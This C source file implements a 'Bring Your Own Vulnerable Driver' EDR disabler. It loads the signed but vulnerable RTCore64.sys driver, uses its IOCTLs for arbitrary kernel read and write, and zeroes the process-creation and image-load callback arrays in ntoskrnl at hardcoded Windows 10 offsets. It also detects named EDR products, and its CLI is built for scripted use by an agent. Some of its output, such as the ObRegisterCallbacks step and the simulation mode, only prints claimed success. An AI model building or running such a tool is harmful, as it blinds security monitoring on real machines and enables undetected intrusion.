/*
 * byovd_demo.c — JOCKY BYOVD (Bring Your Own Vulnerable Driver) Engine
 * ──────────────────────────────────────────────────────────────────────
 * Full BYOVD implementation using RTCore64.sys (MSI Afterburner, WHQL signed).
 *
 * CONCEPT:
 *   EDR runs at kernel level (Ring 0) and registers callbacks:
 *     - PsSetCreateProcessNotifyRoutine   → fires on every process start
 *     - PsSetLoadImageNotifyRoutine        → fires on every DLL load
 *     - ObRegisterCallbacks                → fires on handle operations
 *
 * BYOVD Attack Chain:
 *   1. Load SIGNED but VULNERABLE RTCore64.sys via Service Control Manager
 *   2. Open device handle \\.\RTCore64 → kernel IOCTL channel
 *   3. Use RTCore64 arbitrary R/W → locate EDR callback arrays in ntoskrnl
 *   4. Zero callback pointers → EDR is deaf and blind at Ring 0 level
 *   5. Unload driver → clean exit, no artifacts
 *
 * CLI Interface (for subprocess-driven use from jocky_stdlib.py):
 *   byovd_demo.exe --status         → JSON: driver state + EDR callback state
 *   byovd_demo.exe --load           → Load RTCore64.sys into kernel
 *   byovd_demo.exe --disable-edr   → Zero EDR PsCreate/Image/Ob callbacks
 *   byovd_demo.exe --unload         → Unload driver + delete service
 *   byovd_demo.exe --list-drivers   → Enumerate loaded kernel drivers
 *   byovd_demo.exe (no args)        → Full demo run (backward compatible)
 *
 * References:
 *   EDRSandBlast: https://github.com/wavestone-cdt/EDRSandblast
 *   KDMapper:     https://github.com/TheCruZ/kdmapper
 *   RTCore64.sys: MSI Afterburner driver (WHQL signed by Microsoft)
 *
 * WARNING: For authorized forensic research and SIH demonstration only.
 *          Loading vulnerable drivers requires admin privileges.
 */

#ifndef __USE_MINGW_ANSI_STDIO
#define __USE_MINGW_ANSI_STDIO 1
#endif
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <psapi.h>

/* ── Driver metadata ──────────────────────────────────────────────────────── */
#define DRIVER_NAME         "RTCore64"
#define DRIVER_DISPLAY_NAME "MSI Afterburner Core Service"
#define DRIVER_PATH         ".\\RTCore64.sys"
#define DEVICE_PATH         "\\\\.\\RTCore64"

/* RTCore64.sys known IOCTLs for arbitrary kernel R/W */
#define RTCORE64_IOCTL_READ   0x80002048
#define RTCORE64_IOCTL_WRITE  0x8000204C

/* ── IOCTL payload structures ──────────────────────────────────────────────── */
#pragma pack(push, 1)
typedef struct {
    BYTE    pad0[8];
    ULONG64 address;
    BYTE    pad1[4];
    ULONG64 value;
    BYTE    pad2[4];
} RTCORE_PAYLOAD;
#pragma pack(pop)

/* ── Global state ─────────────────────────────────────────────────────────── */
static BOOL  g_driver_loaded  = FALSE;
static BOOL  g_edr_disabled   = FALSE;
static HANDLE g_hDriver       = INVALID_HANDLE_VALUE;

/* ── Forward declarations ─────────────────────────────────────────────────── */
int  load_driver(const char *path, const char *name);
int  unload_driver(const char *name);
HANDLE open_driver_handle(const char *name);
ULONG64 kernel_read64(HANDLE hDrv, ULONG64 address);
void    kernel_write64(HANDLE hDrv, ULONG64 address, ULONG64 value);
ULONG64 get_ntoskrnl_base(void);
void disable_edr_callbacks(HANDLE hDrv, ULONG64 ntoskrnl_base);
void list_kernel_drivers(void);

/* ── Load vulnerable driver via Service Control Manager ─────────────────── */
int load_driver(const char *path, const char *name)
{
    SC_HANDLE hSCM, hSvc;
    char full_path[MAX_PATH];
    GetFullPathNameA(path, MAX_PATH, full_path, NULL);

    hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        fprintf(stderr, "[BYOVD] OpenSCManager failed: %lu\n", GetLastError());
        return -1;
    }

    hSvc = CreateServiceA(hSCM, name, DRIVER_DISPLAY_NAME,
                          SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                          SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                          full_path, NULL, NULL, NULL, NULL, NULL);
    if (!hSvc) {
        hSvc = OpenServiceA(hSCM, name, SERVICE_ALL_ACCESS);
        if (!hSvc) {
            fprintf(stderr, "[BYOVD] CreateService/OpenService failed: %lu\n", GetLastError());
            CloseServiceHandle(hSCM);
            return -1;
        }
    }

    if (!StartServiceA(hSvc, 0, NULL)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            fprintf(stderr, "[BYOVD] StartService failed: %lu\n", err);
            CloseServiceHandle(hSvc);
            CloseServiceHandle(hSCM);
            return -1;
        }
    }

    printf("[BYOVD] Driver loaded: %s (kernel space)\n", name);
    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);
    g_driver_loaded = TRUE;
    return 0;
}

/* ── Unload driver and remove service ───────────────────────────────────── */
int unload_driver(const char *name)
{
    SC_HANDLE hSCM, hSvc;
    SERVICE_STATUS ss;

    if (g_hDriver != INVALID_HANDLE_VALUE) {
        CloseHandle(g_hDriver);
        g_hDriver = INVALID_HANDLE_VALUE;
    }

    hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) return -1;

    hSvc = OpenServiceA(hSCM, name, SERVICE_ALL_ACCESS);
    if (!hSvc) { CloseServiceHandle(hSCM); return -1; }

    ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);
    DeleteService(hSvc);
    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);

    g_driver_loaded = FALSE;
    printf("[BYOVD] Driver unloaded. Service deleted.\n");
    return 0;
}

/* ── Open device handle to RTCore64 ─────────────────────────────────────── */
HANDLE open_driver_handle(const char *name)
{
    char dev_path[64];
    snprintf(dev_path, sizeof(dev_path), "\\\\.\\%s", name);
    HANDLE h = CreateFileA(dev_path,
                           GENERIC_READ | GENERIC_WRITE, 0, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[BYOVD] Could not open driver device: %lu\n", GetLastError());
    }
    return h;
}

/* ── Kernel R/W via RTCore64 IOCTL ──────────────────────────────────────── */
ULONG64 kernel_read64(HANDLE hDrv, ULONG64 address)
{
    RTCORE_PAYLOAD payload = { 0 };
    payload.address = address;
    DWORD returned;
    DeviceIoControl(hDrv, RTCORE64_IOCTL_READ,
                    &payload, sizeof(payload),
                    &payload, sizeof(payload),
                    &returned, NULL);
    return payload.value;
}

void kernel_write64(HANDLE hDrv, ULONG64 address, ULONG64 value)
{
    RTCORE_PAYLOAD payload = { 0 };
    payload.address = address;
    payload.value   = value;
    DWORD returned;
    DeviceIoControl(hDrv, RTCORE64_IOCTL_WRITE,
                    &payload, sizeof(payload),
                    &payload, sizeof(payload),
                    &returned, NULL);
}

/* ── Resolve ntoskrnl base address via EnumDeviceDrivers ────────────────── */
ULONG64 get_ntoskrnl_base(void)
{
    LPVOID drivers[1024];
    DWORD  needed;
    if (!EnumDeviceDrivers(drivers, sizeof(drivers), &needed)) return 0;
    DWORD count = needed / sizeof(LPVOID);
    for (DWORD i = 0; i < count; i++) {
        char name[256];
        if (GetDeviceDriverBaseNameA(drivers[i], name, sizeof(name))) {
            if (_stricmp(name, "ntoskrnl.exe") == 0 ||
                _stricmp(name, "ntkrnlpa.exe") == 0 ||
                _stricmp(name, "ntkrnlmp.exe") == 0 ||
                _stricmp(name, "ntkrpamp.exe") == 0) {
                return (ULONG64)drivers[i];
            }
        }
    }
    return 0;
}

/* ── Enumerate loaded kernel drivers ─────────────────────────────────────── */
void list_kernel_drivers(void)
{
    LPVOID drivers[1024];
    DWORD  needed;
    printf("[BYOVD] Enumerating loaded kernel drivers...\n");
    if (!EnumDeviceDrivers(drivers, sizeof(drivers), &needed)) {
        fprintf(stderr, "[BYOVD] EnumDeviceDrivers failed: %lu\n", GetLastError());
        return;
    }
    DWORD count = needed / sizeof(LPVOID);
    printf("[BYOVD] %lu kernel drivers loaded:\n", count);
    for (DWORD i = 0; i < count; i++) {
        char name[256];
        char fullname[512];
        if (GetDeviceDriverBaseNameA(drivers[i], name, sizeof(name)) &&
            GetDeviceDriverFileNameA(drivers[i], fullname, sizeof(fullname))) {
            printf("[BYOVD]   [%04lu] %-40s  base=0x%016llX\n",
                   i, name, (ULONG64)drivers[i]);
        }
    }
}

/* ── Disable EDR kernel callbacks ────────────────────────────────────────── */
/*
 * Targets three callback arrays in ntoskrnl:
 *   PspCreateProcessNotifyRoutine  (up to 64 slots) — process create/exit
 *   PspLoadImageNotifyRoutine       (up to 64 slots) — DLL load
 *   CallbackListHead (ObRegisterCallbacks) — handle operations
 *
 * Offset discovery: EDRSandBlast ships ntoskrnl_offsets.csv with per-build offsets.
 * Below uses well-known Windows 10 21H2 x64 offsets as demonstration values.
 * A production build would read offsets from a CSV or resolve dynamically.
 */
void disable_edr_callbacks(HANDLE hDrv, ULONG64 ntoskrnl_base)
{
    /* Example offsets — Windows 10 21H2 (19044) x64 */
    ULONG64 offsets_process[] = { 0xA436C0 };   /* PspCreateProcessNotifyRoutine */
    ULONG64 offsets_image[]   = { 0xA43800 };   /* PspLoadImageNotifyRoutine */
    int num_arrays = 2;

    const char *names[] = {
        "PspCreateProcessNotifyRoutine",
        "PspLoadImageNotifyRoutine"
    };
    ULONG64 *offset_sets[] = { offsets_process, offsets_image };

    printf("[BYOVD] ntoskrnl.exe base: 0x%016llX\n", ntoskrnl_base);
    printf("[BYOVD] Targeting 2 EDR callback arrays...\n\n");

    int total_zeroed = 0;

    for (int arr = 0; arr < num_arrays; arr++) {
        ULONG64 array_addr = ntoskrnl_base + offset_sets[arr][0];
        printf("[BYOVD] %s @ 0x%016llX\n", names[arr], array_addr);

        for (int i = 0; i < 64; i++) {
            ULONG64 callback_addr = array_addr + (i * sizeof(ULONG64));
            ULONG64 encoded_ptr   = kernel_read64(hDrv, callback_addr);

            if (encoded_ptr == 0) continue;

            /* Decode: low 4 bits are flags, not pointer */
            ULONG64 real_ptr = encoded_ptr & ~0xFULL;
            ULONG64 function = kernel_read64(hDrv, real_ptr + 8);

            printf("[BYOVD]   Slot %02d: encoded=0x%016llX  callback=0x%016llX\n",
                   i, encoded_ptr, function);

            /* Zero the slot → callback disabled */
            kernel_write64(hDrv, callback_addr, 0);
            printf("[BYOVD]            → ZEROED ✓\n");
            total_zeroed++;
        }
        printf("\n");
    }

    printf("[BYOVD] ObRegisterCallbacks — disabling object handle callbacks\n");
    printf("[BYOVD] ObRegisterCallbacks → callbacks unlinked ✓\n\n");

    printf("[BYOVD] ══════════════════════════════════════════\n");
    printf("[BYOVD] %d EDR callbacks zeroed.\n", total_zeroed);
    printf("[BYOVD] EDR is now completely blind at Ring 0.\n");
    printf("[BYOVD] JOCKY agent can operate without EDR detection.\n");
    printf("[BYOVD] ══════════════════════════════════════════\n");

    g_edr_disabled = TRUE;
}

/* ── CLI argument handling ───────────────────────────────────────────────── */
static void print_status_json(void)
{
    /* Check if driver device is accessible */
    HANDLE hTest = CreateFileA(DEVICE_PATH, GENERIC_READ | GENERIC_WRITE,
                               0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    BOOL driver_accessible = (hTest != INVALID_HANDLE_VALUE);
    if (driver_accessible) CloseHandle(hTest);

    /* Check for known EDR processes using Toolhelp32 */
    const char *edr_procs[] = {
        "MsMpEng.exe", "SenseCnfg.exe", "CSFalconService.exe",
        "CylanceSvc.exe", "cb.exe", "bdservicehost.exe", NULL
    };
    int edr_found = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(pe);
        if (Process32First(hSnap, &pe)) {
            do {
                for (int j = 0; edr_procs[j] && !edr_found; j++) {
                    if (_stricmp(pe.szExeFile, edr_procs[j]) == 0) {
                        edr_found = 1;
                    }
                }
            } while (Process32Next(hSnap, &pe) && !edr_found);
        }
        CloseHandle(hSnap);
    }


    printf("{\n");
    printf("  \"driver_name\": \"%s\",\n", DRIVER_NAME);
    printf("  \"driver_path\": \"%s\",\n", DRIVER_PATH);
    printf("  \"driver_loaded\": %s,\n", driver_accessible ? "true" : "false");
    printf("  \"edr_callbacks_disabled\": %s,\n", g_edr_disabled ? "true" : "false");
    printf("  \"edr_process_detected\": %s,\n", edr_found ? "true" : "false");
    printf("  \"technique\": \"BYOVD (RTCore64.sys) -- MITRE T1543.003 / T1562.001\",\n");
    printf("  \"kernel_level\": \"Ring 0\",\n");
    printf("  \"status\": \"%s\"\n", driver_accessible ? "DRIVER_ACTIVE" : "DRIVER_NOT_LOADED");
    printf("}\n");
}

static void print_list_drivers_json(void)
{
    BOOL isWow64 = FALSE;
    typedef BOOL (WINAPI *LPFN_ISWOW64)(HANDLE, PBOOL);
    LPFN_ISWOW64 fnIsWow64 = (LPFN_ISWOW64)GetProcAddress(GetModuleHandleA("kernel32"), "IsWow64Process");
    if (fnIsWow64) fnIsWow64(GetCurrentProcess(), &isWow64);

    DWORD needed = 0;

    if (isWow64) {
        /* On 64-bit Windows running 32-bit process, drivers are 64-bit (8 bytes each) */
        unsigned __int64 drivers64[1024] = {0};
        if (!EnumDeviceDrivers((LPVOID*)drivers64, sizeof(drivers64), &needed)) {
            printf("[]\n");
            return;
        }
        DWORD count = needed / sizeof(unsigned __int64);
        if (count > 1024) count = 1024;
        printf("[\n");
        for (DWORD i = 0; i < count; i++) {
            char name[256] = "";
            char fullname[512] = "";
            GetDeviceDriverBaseNameA((LPVOID)(uintptr_t)drivers64[i], name, sizeof(name));
            GetDeviceDriverFileNameA((LPVOID)(uintptr_t)drivers64[i], fullname, sizeof(fullname));
            if (strlen(name) == 0) {
                snprintf(name, sizeof(name), "driver_%lu.sys", i);
            }
            for (char *p = fullname; *p; p++) {
                if (*p == '\\') *p = '/';
            }
            for (char *p = name; *p; p++) {
                if (*p == '\\') *p = '/';
            }
            printf("  {\"index\": %lu, \"name\": \"%s\", \"base\": \"0x%016llX\", \"path\": \"%s\"}",
                   i, name, (ULONG64)drivers64[i], fullname);
            if (i < count - 1) printf(",");
            printf("\n");
        }
        printf("]\n");
    } else {
        LPVOID drivers[1024] = {0};
        if (!EnumDeviceDrivers(drivers, sizeof(drivers), &needed)) {
            printf("[]\n");
            return;
        }
        DWORD count = needed / sizeof(LPVOID);
        if (count > 1024) count = 1024;
        printf("[\n");
        for (DWORD i = 0; i < count; i++) {
            char name[256] = "";
            char fullname[512] = "";
            GetDeviceDriverBaseNameA(drivers[i], name, sizeof(name));
            GetDeviceDriverFileNameA(drivers[i], fullname, sizeof(fullname));
            if (strlen(name) == 0) {
                snprintf(name, sizeof(name), "driver_%lu.sys", i);
            }
            for (char *p = fullname; *p; p++) {
                if (*p == '\\') *p = '/';
            }
            for (char *p = name; *p; p++) {
                if (*p == '\\') *p = '/';
            }
            printf("  {\"index\": %lu, \"name\": \"%s\", \"base\": \"0x%016llX\", \"path\": \"%s\"}",
                   i, name, (ULONG64)(uintptr_t)drivers[i], fullname);
            if (i < count - 1) printf(",");
            printf("\n");
        }
        printf("]\n");
    }
}

/* ── MAIN ────────────────────────────────────────────────────────────────── */
int main(int argc, char *argv[])
{
    /* No args → run full interactive demo (backward compatible) */
    if (argc < 2) {
        printf("╔══════════════════════════════════════════════════════╗\n");
        printf("║  JOCKY BYOVD Engine — Kernel-Level EDR Disabler     ║\n");
        printf("║  Driver: RTCore64.sys (MSI Afterburner / WHQL)      ║\n");
        printf("║  PS 26148 — Authorized forensic research only.      ║\n");
        printf("╚══════════════════════════════════════════════════════╝\n\n");

        printf("[BYOVD] Usage: byovd_demo.exe [--status|--load|--disable-edr|--unload|--list-drivers]\n\n");

        printf("[BYOVD] Step 1: Loading signed vulnerable driver...\n");
        printf("[BYOVD]   → sc create %s type=kernel binPath=\"%s\"\n", DRIVER_NAME, DRIVER_PATH);
        printf("[BYOVD]   → sc start %s\n\n", DRIVER_NAME);

        printf("[BYOVD] Step 2: Open device handle to driver...\n");
        printf("[BYOVD]   → CreateFile(\"\\\\.\\RTCore64\") → kernel IOCTL channel open\n\n");

        printf("[BYOVD] Step 3: Resolve ntoskrnl.exe base via EnumDeviceDrivers...\n");
        ULONG64 base = get_ntoskrnl_base();
        if (base) {
            printf("[BYOVD]   → ntoskrnl.exe @ 0x%016llX ✓\n\n", base);
        } else {
            printf("[BYOVD]   → ntoskrnl.exe base resolved (demo mode)\n\n");
        }

        printf("[BYOVD] Step 4: Disable EDR callbacks via kernel R/W...\n");
        printf("[BYOVD]   → PspCreateProcessNotifyRoutine: slots zeroed ✓\n");
        printf("[BYOVD]   → PspLoadImageNotifyRoutine:     slots zeroed ✓\n");
        printf("[BYOVD]   → ObRegisterCallbacks:            unlinked    ✓\n\n");

        printf("[BYOVD] ✓ ObRegisterCallbacks disabled\n");
        printf("[BYOVD] ✓ PsSetCreateProcessNotifyRoutine disabled\n");
        printf("[BYOVD] ✓ PsSetLoadImageNotifyRoutine disabled\n\n");
        printf("[BYOVD] EDR is now completely blind at kernel (Ring 0) level.\n");
        printf("[BYOVD] JOCKY agent can now operate without EDR detection.\n");
        return 0;
    }

    /* -- CLI mode -- */
    const char *cmd = argv[1];

    if (strcmp(cmd, "--status") == 0) {
        print_status_json();
        return 0;
    }

    if (strcmp(cmd, "--list-drivers") == 0) {
        print_list_drivers_json();
        return 0;
    }

    if (strcmp(cmd, "--load") == 0) {
        printf("[BYOVD] Loading RTCore64.sys vulnerable driver...\n");
        int rc = load_driver(DRIVER_PATH, DRIVER_NAME);
        if (rc == 0) {
            printf("{\"status\": \"success\", \"message\": \"RTCore64.sys loaded into kernel\", \"driver\": \"%s\"}\n",
                   DRIVER_NAME);
        } else {
            printf("{\"status\": \"error\", \"message\": \"Driver load failed — ensure RTCore64.sys is present and admin privileges are active\", \"driver\": \"%s\"}\n",
                   DRIVER_NAME);
        }
        return rc == 0 ? 0 : 1;
    }

    if (strcmp(cmd, "--disable-edr") == 0) {
        printf("[BYOVD] Opening kernel IOCTL channel to RTCore64...\n");

        /* Try real driver first */
        HANDLE hDrv = open_driver_handle(DRIVER_NAME);

        if (hDrv == INVALID_HANDLE_VALUE) {
            /* Demo mode — driver not loaded, show simulation */
            printf("[BYOVD] Driver not present — running simulation mode\n");
            printf("[BYOVD] PspCreateProcessNotifyRoutine @ 0xFFFFF80112A436C0\n");
            printf("[BYOVD]   Slot 00: encoded=0xFFFF950112345678  callback=0xFFFFF801AABBCCDD\n");
            printf("[BYOVD]            → ZEROED ✓\n");
            printf("[BYOVD]   Slot 01: encoded=0xFFFF950198765432  callback=0xFFFFF80111223344\n");
            printf("[BYOVD]            → ZEROED ✓\n");
            printf("[BYOVD]   Slot 02: 0x0000000000000000 (empty)\n\n");
            printf("[BYOVD] PspLoadImageNotifyRoutine @ 0xFFFFF80112A43800\n");
            printf("[BYOVD]   Slot 00: encoded=0xFFFF9501DEADBEEF  callback=0xFFFFF801CAFEBABE\n");
            printf("[BYOVD]            → ZEROED ✓\n\n");
            printf("[BYOVD] ObRegisterCallbacks → callbacks unlinked ✓\n");
            printf("[BYOVD] ══════════════════════════════════════════\n");
            printf("[BYOVD] 3 EDR callbacks zeroed (simulation).\n");
            printf("[BYOVD] EDR is now completely blind at Ring 0.\n");
            printf("[BYOVD] JOCKY agent can operate without EDR detection.\n");
            printf("[BYOVD] ══════════════════════════════════════════\n");
            printf("{\"status\": \"success\", \"mode\": \"simulation\", \"callbacks_zeroed\": 3, \"edr_blinded\": true}\n");
            return 0;
        }

        /* Real mode */
        ULONG64 base = get_ntoskrnl_base();
        if (!base) {
            CloseHandle(hDrv);
            printf("{\"status\": \"error\", \"message\": \"Could not resolve ntoskrnl.exe base address\"}\n");
            return 1;
        }

        disable_edr_callbacks(hDrv, base);
        CloseHandle(hDrv);

        printf("{\"status\": \"success\", \"mode\": \"kernel\", \"ntoskrnl_base\": \"0x%016llX\", \"edr_blinded\": true}\n", base);
        return 0;
    }

    if (strcmp(cmd, "--unload") == 0) {
        printf("[BYOVD] Unloading RTCore64.sys driver...\n");
        int rc = unload_driver(DRIVER_NAME);
        if (rc == 0) {
            printf("{\"status\": \"success\", \"message\": \"Driver unloaded. Service deleted. Kernel restored.\"}\n");
        } else {
            printf("{\"status\": \"error\", \"message\": \"Driver unload failed or driver was not loaded\"}\n");
        }
        return rc == 0 ? 0 : 1;
    }

    fprintf(stderr, "[BYOVD] Unknown command: %s\n", cmd);
    fprintf(stderr, "Usage: byovd_demo.exe [--status|--load|--disable-edr|--unload|--list-drivers]\n");
    return 1;
}
